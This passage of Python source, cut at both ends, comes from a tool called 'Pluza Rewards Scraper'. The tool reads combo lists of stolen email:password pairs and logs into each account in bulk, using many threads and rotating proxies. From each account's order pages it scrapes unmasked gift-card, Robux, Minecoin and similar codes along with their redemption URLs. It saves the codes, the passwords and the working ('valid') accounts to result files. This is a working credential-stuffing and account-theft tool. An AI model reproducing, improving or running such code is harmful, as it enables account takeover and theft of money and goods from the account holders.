                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                'X-Requested-With': 'XMLHttpRequest',
                                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            }

                            code_resp = session.post(action_url, data=post_data, headers=code_headers, timeout=10, verify=False)
                            code_html = code_resp.text if code_resp is not None else ''
                            code_soup = BeautifulSoup(code_html, 'html.parser')
                            code_found = False
                            code = None

                            # Try multiple extraction patterns (exact backup method)
                            try:
                                rs = code_soup.find('div', class_='resendSuccess')
                                if rs:
                                    keys = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
                                    vals = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
                                    for k, v in zip(keys, vals):
                                        key_text = k.get_text(strip=True).upper()
                                        if 'CODE' in key_text or 'PIN' in key_text:
                                            code = v.get_text(strip=True)
                                            if '*' not in code:
                                                code_found = True
                                                break
                            except:
                                pass

                            if not code_found:
                                # Extract code using config pattern
                                config = self.category_config.get(self.category, self.category_config['All'])
                                code_match = re.search(config['code_pattern'], code_html)
                                if code_match:
                                    code = code_match.group(1)
                                    if '*' not in code:
                                        code_found = True

                            if not code_found:
                                # Generic PIN pattern
                                pin_match = re.search(r'PIN\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', code_html, re.I)
                                if pin_match:
                                    code = pin_match.group(1)
                                    if '*' not in code:
                                        code_found = True

                            if not code_found:
                                # Generic CODE pattern
                                code_match = re.search(r'CODE\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', code_html, re.I)
                                if code_match:
                                    code = code_match.group(1)
                                    if '*' not in code:
                                        code_found = True

                            if not code_found:
                                # Look in pre/code tags
                                for tag in code_soup.find_all(['pre', 'code']):
                                    text_content = tag.get_text(strip=True)
                                    for pattern in code_patterns:
                                        if re.match(pattern, text_content):
                                            code = text_content
                                            if '*' not in code:
                                                code_found = True
                                                break
                                    if code_found:
                                        break

                            if not code_found:
                                # Look for clipboard buttons
                                for btn in code_soup.find_all('button', attrs={'data-clipboard-text': True}):
                                    val = btn['data-clipboard-text'].strip()
                                    if val and len(val) >= 15:
                                        code = val
                                        if '*' not in code:
                                            code_found = True
                                            break

                            if not code_found:
                                # Fallback to any pattern match
                                all_codes = re.findall(r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}|[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}|[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}', code_html)
                                for extracted_code in all_codes:
                                    code = extracted_code
                                    if '*' not in code:
                                        code_found = True
                                        break

                            # Check for redemption URL (for gift cards and short codes)
                            redemption_url = None

                            # Check for gift cards first (regardless of length)
                            if 'gift' in code_info.lower() or 'card' in code_info.lower() or '$' in code_info.lower() or 'amazon' in code_info.lower() or 'spotify' in code_info.lower():
                                # Debug: Print HTML content for gift cards
                                console.print(f"[DEBUG] Gift card detected: {code} | Searching for redemption URL in HTML...", style="dim yellow")
                                console.print(f"[DEBUG] HTML snippet: {code_html[:500]}...", style="dim red")

                                # Try multiple patterns for redemption URLs - updated with your specific pattern
                                patterns = [
                                    # Pattern for single quotes (actual HTML)
                                    r"<div class='tango-credential-key'><a href='([^']*)'[^>]*>Redemption URL</a></div>",
                                    r"<div class='tango-credential-key'><a href='([^']*)'[^>]*target='_blank'>Redemption URL</a></div>",
                                    # Mixed quotes pattern
                                    r"<div class=['\"]tango-credential-key['\"]><a href=['\"]([^'\"]*)['\"][^>]*>Redemption URL</a></div>",
                                    # Flexible patterns with single quotes
                                    r"<div[^>]*class=['\"]tango-credential-key['\"][^>]*>.*?<a[^>]*href=['\"]([^'\"]*)['\"][^>]*>Redemption URL</a>.*?</div>",
                                    r"<div[^>]*class=['\"]tango-credential-key['\"][^>]*>\s*<a[^>]*href=['\"]([^'\"]*)['\"][^>]*>Redemption URL</a>\s*</div>",
                                    # Double quote patterns (fallback)
                                    r'<div class="tango-credential-key"><a href="([^"]*)"[^>]*>Redemption URL</a></div>',
                                    r'<div class="tango-credential-key"><a href="([^"]*)"[^>]*target="_blank">Redemption URL</a></div>',
                                    r'<div[^>]*class="tango-credential-key"[^>]*>.*?<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>.*?</div>',
                                    # Generic patterns
                                    r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>',
                                    r'<a[^>]*href="([^"]*)"[^>]*>Redeem</a>',
                                    r'<a[^>]*href="([^"]*)"[^>]*>Claim</a>',
                                    r'href="([^"]*redeem[^"]*)"',
                                    r'href="([^"]*claim[^"]*)"',
                                    r'Redemption URL:\s*(https?://[^\s<>"\']+)',
                                    r'URL:\s*(https?://[^\s<>"\']+)',
                                    # Last resort - any https URL in the HTML
                                    r'https?://[^\s<>"\'\)]+',
                                ]

                                for i, pattern in enumerate(patterns):
                                    redemption_url_match = re.search(pattern, code_html, re.IGNORECASE | re.DOTALL)
                                    if redemption_url_match:
                                        redemption_url = redemption_url_match.group(1).strip().replace('\n', '').replace(' ', '')
                                        console.print(f"[DEBUG] Found redemption URL with pattern {i}: {redemption_url}", style="dim green")
                                        break

                                if not redemption_url:
                                    console.print(f"[DEBUG] No redemption URL found for {code}", style="dim red")

                            # Also check for short codes (8 chars or less)
                            elif code_found and code and len(code.replace('-', '')) <= 8:
                                redemption_url_match = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', code_html)
                                if redemption_url_match:
                                    redemption_url = redemption_url_match.group(1)

                            if code_found and code:
                                result = {
                                    'email': email,
                                    'password': password,
                                    'code': code,
                                    'info': code_info,
                                    'category': self.category,
                                    'date': order_date or datetime.now().strftime('%Y-%m-%d %H:%M:%S'),  # Use order date, fallback to current time
                                    'redemption_url': redemption_url or ""
                                }

                                self.results.append(result)

                                if email not in [acc[0] for acc in self.valid_accounts]:
                                    self.valid_accounts.append((email, password))

                        except Exception as e:
                            continue
                    elif resend_button:
                        continue
                    else:
                        # Fallback to old method for rows without "Get code" button
                        order_title = cells[2].get_text(strip=True) if len(cells) > 2 else ""
                        # Extract order date from the second cell (usually contains date)
                        order_date = cells[1].get_text(strip=True) if len(cells) > 1 else ""
                        code_cell = cells[3] if len(cells) > 3 else cells[2]
                        code_text = code_cell.get_text(strip=True)

                        for pattern in code_patterns:
                            codes_found = re.findall(pattern, code_text.upper())
                            for code in codes_found:
                                # Skip masked codes
                                if '*' in code:
                                    continue

                                # Skip if code is in exclude list
                                if code in exclude_words:
                                    continue

                                # Skip if code doesn't have enough alphanumeric characters
                                alnum_count = sum(c.isalnum() for c in code.replace('-', ''))
                                if alnum_count < 12:
                                    continue

                                # Additional validation
                                parts = code.split('-')
                                if len(parts) < 3:
                                    continue

                                if len(set(len(part) for part in parts)) > 1:
                                    continue

                                if any(part.count(part[0]) > 2 for part in parts):
                                    continue

                                # Get category
                                detected_category = self.detect_category_from_title(order_title, full_row_text)

                                # Extract code info
                                code_info = self.extract_code_info(order_title, detected_category, full_row_text)

                                # Check for redemption URL for gift cards
                                redemption_url = None
                                if 'gift' in code_info.lower() or 'card' in code_info.lower() or '$' in code_info.lower() or 'amazon' in code_info.lower() or 'spotify' in code_info.lower():
                                    redemption_url_match = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', code_text)
                                    if redemption_url_match:
                                        redemption_url = redemption_url_match.group(1)

                                result = {
                                    'email': email,
                                    'password': password,
                                    'code': code,
                                    'info': code_info,
                                    'category': detected_category,
                                    'date': order_date or datetime.now().strftime('%Y-%m-%d %H:%M:%S'),  # Use order date, fallback to current time
                                    'redemption_url': redemption_url or ""
                                }

                                self.results.append(result)

                                if email not in [acc[0] for acc in self.valid_accounts]:
                                    self.valid_accounts.append((email, password))

                # If no table found, try alternative parsing
                if not rows:
                    # Look for any div or span with code patterns
                    all_text = soup.get_text()
                    for pattern in code_patterns:
                        codes_found = re.findall(pattern, all_text.upper())
                        for code in codes_found:
                            if '*' in code:
                                continue

                            # Skip if code is in exclude list
                            if code in exclude_words:
                                continue

                            # Skip if code doesn't have enough alphanumeric characters
                            alnum_count = sum(c.isalnum() for c in code.replace('-', ''))
                            if alnum_count < 8:  # Require at least 8 alphanumeric chars
                                continue

                            # Try to find context
                            parent = soup.find(string=re.compile(code))
                            if parent:
                                parent_element = parent.parent
                                context_text = parent_element.get_text(strip=True) if parent_element else ""

                                # Extract category from context
                                detected_category = self.detect_category_from_title(context_text, context_text)

                                # Extract code info
                                code_info = self.extract_code_info(context_text, detected_category, context_text)

                                # Check for redemption URL for gift cards
                                redemption_url = None
                                if 'gift' in code_info.lower() or 'card' in code_info.lower() or '$' in code_info.lower() or 'amazon' in code_info.lower() or 'spotify' in code_info.lower():
                                    redemption_url_match = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', all_text)
                                    if redemption_url_match:
                                        redemption_url = redemption_url_match.group(1)

                                result = {
                                    'email': email,
                                    'password': password,
                                    'code': code,
                                    'info': code_info,
                                    'category': detected_category,
                                    'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                    'redemption_url': redemption_url or ""
                                }

                                self.results.append(result)

                                if email not in [acc[0] for acc in self.valid_accounts]:
                                    self.valid_accounts.append((email, password))

                return True if self.results else False

            except Exception as e:
                print(f"Error scraping {email}: {e}")
                return False

        except Exception as e:
            print(f"Error with {email}: {e}")
            return False

    def check_single(self, email, password):
        """Check single account with proxy retry logic"""
        max_retries = 2  # Reduced from 3 to 2 for speed
        last_error = None

        for attempt in range(max_retries):
            try:
                success = self.login_and_scrape(email, password)
                if success:
                    return True
                else:
                    self.invalid_accounts.append((email, password))
                    return False

            except Exception as e:
                # Check if it's a connection error and retry with proxy
                error_msg = str(e).lower()
                if any(keyword in error_msg for keyword in ['timeout', 'connection', 'network', 'ssl', 'certificate', 'aborted', 'file not found']) and attempt < max_retries - 1:
                    if self.proxy_manager and self.proxy_manager.proxy_settings.get('use_proxies', False):
                        proxy = self.proxy_manager.get_random_proxy()
                        if proxy:
                            # Temporarily set proxy for next attempt
                            original_use_proxies = self.proxy_manager.proxy_settings.get('use_proxies')
                            self.proxy_manager.proxy_settings['use_proxies'] = True
                            console.print(f"[*] Retrying {email} with proxy (attempt {attempt + 2}/{max_retries})", style="yellow")
                            continue

                # If it's the last attempt or not a connection error, break
                break

        # All retries failed
        self.invalid_accounts.append((email, password))
        return False

    def check_all(self):
        """Check all accounts with multi-threading"""
        if not self.accounts:
            console.print("[!] No accounts to check", style="red")
            return

        console.print("\n" + "╔" + "═"*59 + "╗", style="cyan")
        console.print("║" + " " * 20 + f"prs - {self.category.upper()} SCRAPER" + " " * 22 + "║", style="cyan")
        console.print("╚" + "═"*59 + "╝", style="cyan")

        max_threads = self.settings.get('max_threads', 100)
        console.print(f"[*] Starting batch check: {len(self.accounts)} accounts", style="cyan")
        console.print(f"[*] Category: {self.category} | Timeout: {self.settings.get('timeout')}s | Threads: {max_threads}", style="cyan")

        with Progress(
            TextColumn("[cyan]{task.description}"),
            BarColumn(bar_width=30, style="cyan", complete_style="cyan"),
            TextColumn("[cyan]{task.percentage:>3.0f}% | CPM: {task.fields[cpm]:>3.0f}"),
            console=console,
            refresh_per_second=5  # Update every 0.2 seconds for smooth display
        ) as progress:
            task = progress.add_task(f"[cyan]Checking accounts...", total=len(self.accounts), cpm=0)

            # Track CPM calculation (Accounts Per Minute)
            start_time = time.time()
            last_accounts_checked = 0
            last_cpm_update = start_time
            last_progress_update = start_time
            accounts_at_last_update = 0

            # Process accounts in batches for better progress tracking
            batch_size = 500  # Increased batch size for better performance
            completed_count = 0

            for batch_start in range(0, len(self.accounts), batch_size):
                batch_end = min(batch_start + batch_size, len(self.accounts))
                batch_accounts = self.accounts[batch_start:batch_end]

                with ThreadPoolExecutor(max_workers=max_threads) as executor:
                    futures = {executor.submit(self.check_single, email, password): (email, password)
                              for email, password in batch_accounts}

                    for future in as_completed(futures):
                        email, password = futures[future]
                        try:
                            result = future.result()
                            # Show codes in clean format only
                            if result and self.results:
                                # Find codes found for this account
                                account_codes = [r for r in self.results if r['email'] == email]
                                if account_codes:
                                    for code_result in account_codes:
                                        # Only show if not already shown
                                        if not hasattr(self, '_shown_codes'):
                                            self._shown_codes = set()
                                        code_key = (code_result['code'], code_result['email'])
                                        if code_key not in self._shown_codes:
                                            # Check if this is a gift card with redemption URL
                                            if code_result['category'].lower() == 'giftcards' and code_result.get('redemption_url'):
                                                # Show full format for gift cards with redemption URLs
                                                console.print(f"[ + ] Code: {code_result['code']}", style="green")
                                                console.print(f"     URL: {code_result['redemption_url']}", style="cyan")
                                                console.print(f"     Account: {code_result['email']}", style="blue")
                                                console.print(f"     Password: {code_result['password']}", style="blue")
                                                console.print(f"     Info: {code_result['info']}", style="yellow")
                                                console.print(f"     Date: {code_result['date']}", style="dim")
                                                console.print(f"     {'-'*30}", style="dim")
                                            else:
                                                # Clean format for other codes: [ + ] CODE | INFO
                                                console.print(f"[ + ] {code_result['code']} | {code_result['info']}", style="green")
                                            self._shown_codes.add(code_key)
                        except Exception as e:
                            # Don't show any errors or failures
                            pass

                        completed_count += 1
                        progress.advance(task)

                        current_time = time.time()

                        # Update progress display every 5 seconds
                        if current_time - last_progress_update >= 5:
                            elapsed_minutes = (current_time - start_time) / 60
                            apm = completed_count / elapsed_minutes if elapsed_minutes > 0 else 0
                            progress.update(task, cpm=apm)
                            last_progress_update = current_time

        console.print(f"\n[✓] Completed: {len(self.accounts)} accounts checked", style="green")
        console.print(f"[+] Codes found: {len(self.results)}", style="cyan")

        # Save results using backup method
        if self.results:
            self.save_results()

    def save_results(self):
        """Save results to timestamped folder with category txt files (exact backup method)"""
        timestamp = datetime.now().strftime('%m%d%Y%H%M')
        results_folder = Path(__file__).parent / f"results-{timestamp}"

        try:
            # Create results folder
            results_folder.mkdir(exist_ok=True)

            # Create category txt files and save codes
            category_codes = {}

            # Organize codes by category (exact backup method)
            for result in self.results:
                code = result['code']
                info = result['info']
                email = result['email']
                password = result['password']

                # Detect category from title (exact backup method)
                detected_category = self.detect_category_from_title(info, info)

                # Normalize category name for file (exact backup method)
                if detected_category == 'Unknown':
                    # If category is Unknown but we have a title with amount info, try to infer
                    if '200 coins' in info.lower() or '500 coins' in info.lower() or '1000 coins' in info.lower():
                        file_name = 'overwatch'
                    elif 'robux' in info.lower():
                        file_name = 'roblox'
                    elif 'minecoins' in info.lower() or 'minecraft' in info.lower():
                        file_name = 'minecraft'
                    elif 'rp' in info.lower():
                        file_name = 'leagueoflegends'
                    elif 'gift' in info.lower() or 'card' in info.lower() or '$' in info.lower():
                        file_name = 'giftcards'
                    elif 'game pass' in info.lower():
                        file_name = 'gamepass'
                    else:
                        file_name = 'unknown'
                else:
                    file_name = detected_category.lower().replace(' ', '').replace('of', 'of')

                if file_name not in category_codes:
                    category_codes[file_name] = []

                category_codes[file_name].append({
                    'code': code,
                    'title': info,
                    'email': email,
                    'password': password
                })

            # Create category txt files and save codes (exact backup method)
            for category, codes in category_codes.items():
                category_file = results_folder / f"{category}.txt"
                with open(category_file, 'w', encoding='utf-8') as f:
                    f.write(f"{category.upper()} CODES\n")
                    f.write(f"{'='*50}\n\n")

                    for code_info in codes:
                        # Special handling for giftcards with redemption URLs
                        if category.lower() == 'giftcards' and any(result.get('redemption_url') for result in self.results if result['code'] == code_info['code']):
                            # Find the result with redemption URL
                            redemption_result = next((r for r in self.results if r['code'] == code_info['code'] and r.get('redemption_url')), None)
                            if redemption_result:
                                f.write(f"Code: {code_info['code']}\n")
                                f.write(f"URL: {redemption_result['redemption_url']}\n")
                                f.write(f"Account: {code_info['email']}\n")
                                f.write(f"Password: {code_info['password']}\n")
                                f.write(f"Info: {code_info['title']}\n")
                                f.write(f"Date: {redemption_result['date']}\n")
                                f.write(f"{'-'*30}\n\n")
                            else:
                                # Standard format if no redemption URL found
                                f.write(f"{code_info['code']}\n")
                                f.write(f"Account: {code_info['email']}\n")
                                f.write(f"Password: {code_info['password']}\n")
                                f.write(f"Info: {code_info['title']}\n")
                                # Find the result to get the actual date
                                result_match = next((r for r in self.results if r['code'] == code_info['code']), None)
                                if result_match:
                                    f.write(f"Date: {result_match['date']}\n")
                                else:
                                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                                f.write(f"{'-'*30}\n\n")
                        else:
                            # Standard format for non-giftcards or giftcards without redemption URLs
                            f.write(f"{code_info['code']}\n")
                            f.write(f"Account: {code_info['email']}\n")
                            f.write(f"Password: {code_info['password']}\n")
                            f.write(f"Info: {code_info['title']}\n")
                            # Find the result to get the actual date
                            result_match = next((r for r in self.results if r['code'] == code_info['code']), None)
                            if result_match:
                                f.write(f"Date: {result_match['date']}\n")
                            else:
                                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                            f.write(f"{'-'*30}\n\n")

            # Also create sorted versions of each category file
            console.print(f"\n[🔄] Creating sorted category files...", style="cyan")
            for category, codes in category_codes.items():
                sort_and_save_codes(results_folder, codes, category, self.results)

            # Save valid accounts file (exact backup method)
            valid_file = results_folder / "valid.txt"
            with open(valid_file, 'w', encoding='utf-8') as f:
                f.write("VALID ACCOUNTS\n")
                f.write(f"{'='*50}\n\n")

                for email, password in self.accounts:
                    if email in [acc[0] for acc in self.valid_accounts]:
                        f.write(f"{email}:{password}\n")

            # Create summary file (exact backup method)
            summary_file = results_folder / "summary.txt"
            with open(summary_file, 'w', encoding='utf-8') as f:
                f.write(f"{'═'*70}\n")
                f.write(f"{self.category.upper()} Results Summary - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'═'*70}\n")
                f.write(f"Valid Accounts: {len(self.valid_accounts)}\n")
                f.write(f"Invalid Accounts: {len(self.invalid_accounts)}\n")
                f.write(f"Total Codes: {len(self.results)}\n")
                f.write(f"{'═'*70}\n\n")

                # List codes by category
                for category, codes in category_codes.items():
                    f.write(f"{category.upper()} ({len(codes)} codes):\n")
                    for code_info in codes:
                        f.write(f"  {code_info['code']} - {code_info['title']}\n")
                    f.write("\n")

                f.write(f"{'═'*70}\n")
                f.write("Multi-Platform Rewards Scraper\n")
                f.write(f"{'═'*70}\n")

            console.print(f"✓ Results saved to: {results_folder}", style="green")
            console.print(f"✓ Created {len(category_codes)} category files", style="green")
            console.print(f"✓ Valid accounts saved to: valid.txt", style="green")
        except Exception as e:
            console.print(f"[!] Failed to save: {e}", style="red")

    def save_valid_accounts(self):
        """Save valid accounts to file"""
        timestamp = datetime.now().strftime("%m%d%Y%H%M")
        results_dir = Path(f"results-{timestamp}")
        results_dir.mkdir(exist_ok=True)

        valid_file = results_dir / "valid.txt"
        with open(valid_file, 'w', encoding='utf-8') as f:
            for email, password in self.valid_accounts:
                f.write(f"{email}:{password}\n")
        console.print(f"[✓] Valid accounts saved to: {valid_file}", style="green")


class ProxyManager:
    """Manage proxy lists and testing"""

    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.settings_file = Path("prs_settings.json")
        self.proxy_settings = {
            'timeout': 10,
            'test_url': 'https://login.live.com/',
            'rotate': False,
            'remove_failed': True,
            'check_threads': 50,  # Number of threads for proxy checking
            'use_proxies': False  # Whether to use proxies for scraping
        }
        self.load_settings()
        self.load_proxies()

    def load_settings(self):
        """Load proxy settings from file"""
        if self.settings_file.exists():
            try:
                with open(self.settings_file, 'r', encoding='utf-8') as f:
                    saved_settings = json.load(f)
                    # Update default settings with saved settings
                    self.proxy_settings.update(saved_settings)
                    console.print(f"[✓] Loaded proxy settings from {self.settings_file}", style="green")
            except Exception as e:
                console.print(f"[!] Error loading settings: {e}", style="red")

    def save_settings(self):
        """Save proxy settings to file"""
        try:
            with open(self.settings_file, 'w', encoding='utf-8') as f:
                json.dump(self.proxy_settings, f, indent=2)
            console.print(f"[✓] Proxy settings saved to {self.settings_file}", style="green")
        except Exception as e:
            console.print(f"[!] Error saving settings: {e}", style="red")

    def load_proxies(self):
        """Load proxies from file"""
        proxy_file = Path("proxies.txt")
        working_proxy_file = Path("working_proxies.txt")

        # Load all proxies
        if proxy_file.exists():
            try:
                with open(proxy_file, 'r', encoding='utf-8') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                console.print(f"[+] Loaded {len(self.proxies)} proxies from file", style="green")
            except Exception as e:
                console.print(f"[!] Error loading proxies: {e}", style="red")
        else:
            console.print("[!] No proxies.txt file found", style="yellow")

        # Load working proxies
        if working_proxy_file.exists():
            try:
                with open(working_proxy_file, 'r', encoding='utf-8') as f:
                    self.working_proxies = [line.strip() for line in f if line.strip()]
                console.print(f"[+] Loaded {len(self.working_proxies)} working proxies", style="green")
            except Exception as e:
                console.print(f"[!] Error loading working proxies: {e}", style="red")

    def save_proxies(self):
        """Save proxies to file"""
        try:
            with open("proxies.txt", 'w', encoding='utf-8') as f:
                for proxy in self.proxies:
                    f.write(f"{proxy}\n")
            console.print(f"[+] Saved {len(self.proxies)} proxies to file", style="green")
        except Exception as e:
            console.print(f"[!] Error saving proxies: {e}", style="red")

    def save_working_proxies(self):
        """Save working proxies to separate file"""
        try:
            with open("working_proxies.txt", 'w', encoding='utf-8') as f:
                for proxy in self.working_proxies:
                    f.write(f"{proxy}\n")
            console.print(f"[+] Saved {len(self.working_proxies)} working proxies to file", style="green")
        except Exception as e:
            console.print(f"[!] Error saving working proxies: {e}", style="red")

    def add_proxy(self, proxy):
        """Add a proxy to the list"""
        if proxy not in self.proxies:
            self.proxies.append(proxy)
            return True
        return False

    def remove_proxy(self, proxy):
        """Remove a proxy from the list"""
        if proxy in self.proxies:
            self.proxies.remove(proxy)
            return True
        return False

    def test_proxy(self, proxy):
        """Test if a proxy is working"""
        try:
            proxy_dict = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            response = requests.get(
                self.proxy_settings['test_url'],
                proxies=proxy_dict,
                timeout=self.proxy_settings['timeout'],
                verify=False
            )
            return response.status_code == 200
        except:
            return False

    def test_all_proxies(self):
        """Test all proxies and update working list"""
        console.print(f"[*] Testing {len(self.proxies)} proxies...", style="cyan")
        self.working_proxies = []

        with Progress(
            TextColumn("[cyan]{task.description}"),
            BarColumn(bar_width=30, style="cyan", complete_style="cyan"),
            TextColumn("[cyan]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Testing proxies...", total=len(self.proxies))

            def test_single_proxy(proxy):
                if self.test_proxy(proxy):
                    self.working_proxies.append(proxy)
                progress.advance(task)

            # Use threading for faster proxy checking
            with ThreadPoolExecutor(max_workers=self.proxy_settings['check_threads']) as executor:
                futures = [executor.submit(test_single_proxy, proxy) for proxy in self.proxies]
                for future in as_completed(futures):
                    future.result()

        console.print(f"[+] Working proxies: {len(self.working_proxies)}/{len(self.proxies)}", style="green")

        # Save working proxies to file
        self.save_working_proxies()

        # Remove failed proxies if setting is enabled
        if self.proxy_settings['remove_failed']:
            failed_count = len(self.proxies) - len(self.working_proxies)
            if failed_count > 0:
                self.proxies = self.working_proxies.copy()
                self.save_proxies()
                console.print(f"[-] Removed {failed_count} failed proxies", style="yellow")

    def get_random_proxy(self):
        """Get a random working proxy"""
        if self.working_proxies:
            import random
            return random.choice(self.working_proxies)
        return None

    def get_next_proxy(self):
        """Get next proxy for rotation"""
        if not self.working_proxies:
            return None

        if not hasattr(self, '_proxy_index'):
            self._proxy_index = 0

        proxy = self.working_proxies[self._proxy_index]
        self._proxy_index = (self._proxy_index + 1) % len(self.working_proxies)
        return proxy

    def clear_proxies(self):
        """Clear all proxies"""
        self.proxies = []
        self.working_proxies = []
        try:
            Path("proxies.txt").unlink(missing_ok=True)
            Path("working_proxies.txt").unlink(missing_ok=True)
            console.print("[+] All proxies cleared", style="green")
        except:
            pass


class RewardsApp:
    """Main application class"""

    def __init__(self):
        self.settings = Settings()
        self.accounts = []
        self.proxy_manager = ProxyManager()

    def show_animated_logo(self):
        """Display simple title screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
        console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
        console.print("║" + " " * 16 + "prs - Pluza Rewards Scraper" + " " * 15 + "║", style="cyan")
        console.print("╠" + "═"*58 + "╣", style="cyan")
        console.print("║  1. MINECRAFT - Minecraft Minecoins Checker              ║", style="cyan")
        console.print("║  2. ROBLOX - Robux & Items Checker                       ║", style="cyan")
        console.print("║  3. LEAGUE OF LEGENDS - RP Points Checker                ║", style="cyan")
        console.print("║  4. OVERWATCH - Overwatch Coins Checker                  ║", style="cyan")
        console.print("║  5. SEA OF THIEVES - Coins Checker                       ║", style="cyan")
        console.print("║  6. GAME PASS - Xbox Game Pass Checker                   ║", style="cyan")
        console.print("║  7. GIFTCARDS - Gift Cards Checker                       ║", style="cyan")
        console.print("║  8. ALL CATEGORIES - All Platforms Checker               ║", style="cyan")
        console.print("║  9. SETTINGS - Configuration Settings                    ║", style="cyan")
        console.print("║  10. PROXY - Proxy Configuration                         ║", style="cyan")
        console.print("║  11. EXIT - Exit Program                                 ║", style="cyan")
        console.print("║ programed by @plutobearz                                 ║", style="cyan")
        console.print("╚" + "═"*58 + "╝", style="cyan")
        console.print("\nSelect option (1-11): ", style="cyan", end="")

    def show_main_menu(self):
        """Display main menu and handle user input"""
        while True:
            self.show_animated_logo()

            try:
                choice = input().strip()

                if choice == '1':
                    self.scraper_menu('Minecraft')
                elif choice == '2':
                    self.scraper_menu('Roblox')
                elif choice == '3':
                    self.scraper_menu('League of Legends')
                elif choice == '4':
                    self.scraper_menu('Overwatch')
                elif choice == '5':
                    self.scraper_menu('Sea of Thieves')
                elif choice == '6':
                    self.scraper_menu('Game Pass')
                elif choice == '7':
                    self.scraper_menu('Giftcards')
                elif choice == '8':
                    self.scraper_menu('All')
                elif choice == '9':
                    self.settings_menu()
                elif choice == '10':
                    self.proxy_menu()
                elif choice == '11':
                    console.print("\n[+] Goodbye!", style="green")
                    sys.exit(0)
                else:
                    console.print("\n[!] Invalid option. Please try again.", style="red")
                    time.sleep(1)
            except KeyboardInterrupt:
                console.print("\n[+] Goodbye!", style="green")
                sys.exit(0)
            except Exception as e:
                console.print(f"\n[!] Error: {e}", style="red")
                time.sleep(1)

    def scraper_menu(self, category):
        """Display scraper menu for selected category"""
        os.system('cls' if os.name == 'nt' else 'clear')
        console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
        console.print("║" + " " * 20 + f"prs - {category.upper()} SCRAPER" + " " * 20 + "║", style="cyan")
        console.print("╚" + "═"*58 + "╝", style="cyan")

        # Get combo file using tkinter file dialog
        console.print("Opening file explorer...", style="cyan")
        root = Tk()
        root.withdraw()
        root.attributes('-topmost', True)

        file_path = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )

        root.destroy()

        if not file_path:
            console.print("[!] No file selected", style="red")
            time.sleep(2)
            return

        # Parse combo file
        parser = ComboParser(file_path)
        accounts = parser.parse()

        load_error = None
        if not accounts:
            load_error = "No valid EMAIL:PASS combinations found"

        if load_error:
            console.print(f"[!] {load_error}", style="red")
            time.sleep(2)
            return

        if not accounts:
            console.print("[!] No valid EMAIL:PASS found in file", style="red")
            time.sleep(2)
            return

        console.print(f"\n✓ Loaded {len(accounts)} accounts\n", style="green")

        # Show confirmation
        console.print("Accounts to check:", style="cyan")

        table = Table()
        table.add_column("Email", style="cyan")
        table.add_column("Password", style="yellow")

        # Show first 10
        for email, password in accounts[:10]:
            pwd_masked = password[:3] + "*" * (len(password) - 3)
            table.add_row(email, pwd_masked)

        if len(accounts) > 10:
            table.add_row(f"... and {len(accounts) - 10} more", "")

        console.print(table)
        console.print(f"\nTotal: {len(accounts)} accounts\n", style="yellow")

        response = input("→ Start checking? (y/n): ").strip().lower()

        if response not in ['y', 'yes']:
            console.print("[!] Aborted by user", style="red")
            time.sleep(1)
            return

        # Run scraper
        scraper = MultiPlatformScraper(accounts, self.settings, category, self.proxy_manager)
        scraper.check_all()

        console.print("\n✓ Done!", style="green")
        input("Press Enter to return to menu...")


    def settings_menu(self):
        """Settings configuration menu"""
        first_time = True
        while True:
            if first_time:
                os.system('cls' if os.name == 'nt' else 'clear')
            else:
                console.print("\n" + "="*70, style="cyan")

            console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
            console.print("║" + " " * 20 + "prs - SETTINGS" + " " * 20 + "║", style="cyan")
            console.print("╚" + "═"*58 + "╝", style="cyan")

            console.print("\n[cyan]Current Settings:[/cyan]\n")

            settings_display = [
                ("Timeout (seconds)", 'timeout'),
                ("Max Threads", 'max_threads'),
                ("Retry Count", 'retry_count'),
                ("Save Invalid Accounts", 'save_invalid'),
                ("Auto Save Results", 'auto_save'),
                ("Default Category", 'selected_category')
            ]

            for i, (display_name, key) in enumerate(settings_display, 1):
                value = self.settings.get(key)
                if isinstance(value, bool):
                    value = "Enabled" if value else "Disabled"
                console.print(f"  {i}. {display_name}: [yellow]{value}[/yellow]")

            console.print("\n  0. Back to Main Menu")
            console.print("\nSelect setting to modify (0-6): ", style="cyan", end="")

            try:
                choice = input().strip()

                if choice == '0':
                    break
                elif choice in ['1', '2', '3', '4', '5', '6']:
                    idx = int(choice) - 1
                    _, key = settings_display[idx]
                    self.modify_setting(key)
                else:
                    console.print("\n[!] Invalid option", style="red")
                    time.sleep(1)
            except KeyboardInterrupt:
                break

            first_time = False

        self.settings.save()

    def modify_setting(self, key):
        """Modify a specific setting"""
        current_value = self.settings.get(key)

        console.print(f"\nCurrent value: {current_value}")
        console.print("Enter new value (or press Enter to keep current): ", style="cyan", end="")

        new_value = input().strip()

        if not new_value:
